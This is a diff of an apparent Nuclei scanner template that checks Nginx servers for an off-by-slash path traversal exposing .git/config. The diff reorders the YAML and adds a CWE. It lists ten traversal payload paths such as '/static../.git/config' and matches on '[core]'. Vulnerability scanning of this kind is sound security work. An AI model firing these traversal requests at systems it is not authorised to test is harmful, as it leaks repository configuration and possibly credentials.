@@ -1,5 +1,4 @@
 id: git-config-nginxoffbyslash
-
 info:
   name: Nginx - Git Configuration Exposure
   author: organiccrap
@@ -12,31 +11,28 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
     cvss-score: 5.3
-    cwe-id: CWE-200
+    cwe-id: CWE-200,CWE-23
   metadata:
     max-request: 10
   tags: config,exposure,nginx,vuln
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}{{paths}}"
-
-    payloads:
-      paths:
-        - '/static../.git/config'
-        - '/js../.git/config'
-        - '/images../.git/config'
-        - '/img../.git/config'
-        - '/css../.git/config'
-        - '/assets../.git/config'
-        - '/content../.git/config'
-        - '/events../.git/config'
-        - '/media../.git/config'
-        - '/lib../.git/config'
-    stop-at-first-match: true
-    matchers:
+  - matchers:
       - type: word
         words:
           - '[core]'
-
+    method: GET
+    path:
+      - '{{BaseURL}}{{paths}}'
+    payloads:
+      paths:
+        - /static../.git/config
+        - /js../.git/config
+        - /images../.git/config
+        - /img../.git/config
+        - /css../.git/config
+        - /assets../.git/config
+        - /content../.git/config
+        - /events../.git/config
+        - /media../.git/config
+        - /lib../.git/config
+    stop-at-first-match: true
